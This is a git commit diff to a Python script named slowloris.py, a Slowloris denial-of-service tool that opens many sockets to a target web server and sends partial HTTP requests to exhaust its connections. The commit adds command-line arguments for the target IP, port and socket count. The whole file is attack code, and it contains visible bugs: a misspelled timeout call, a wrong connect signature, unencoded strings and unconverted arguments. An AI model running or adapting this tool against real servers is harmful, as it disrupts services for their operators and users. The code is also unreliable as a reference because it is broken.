9f184c56e8c42403652db77140bd2126f9eaa358
adam_stuart <adam.stuart729@gmail.com>
2025-03-28 13:47:53 +0000

    command line functionality

--- slowloris.py
+++ slowloris.py
@@ -1,19 +1,17 @@
 import socket
 import random
+import sys
 
-port = 80 # 80 is usually used for http requests
-ip = "nope"
-socket_count = 200
 sockets = []
 
-def create_socket(ip, port):
+def create_socket(IP, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimout(4) # maybe this line can be removed or set really high idk yet
-    s.connect(ip, port)
+    s.connect(IP, port)
     s.send(f"GET /?{random.randint(1,255)} HTTP/1.1\r\n")
     return s
 
-def slowloris():
+def slowloris(IP, port, socket_count):
 
     # TODO use argv to pass in IP and port and socket count
     
@@ -22,7 +20,7 @@ def slowloris():
         # Make sure there are still socket_count sockets
         for i in range(socket_count - len(sockets)):
             try:
-                s = create_socket(ip, port)
+                s = create_socket(IP, port)
                 sockets.append(s)
             except:
                 print("socket could not be established")
@@ -35,4 +33,11 @@ def slowloris():
                 sockets.remove(s)
 
 if __name__ == "__main__":
-    slowloris()
+
+    args = sys.argv
+
+    IP = args[1]
+    port = args[2]
+    socket_count = args[3]
+    
+    slowloris(IP, port, socket_count)
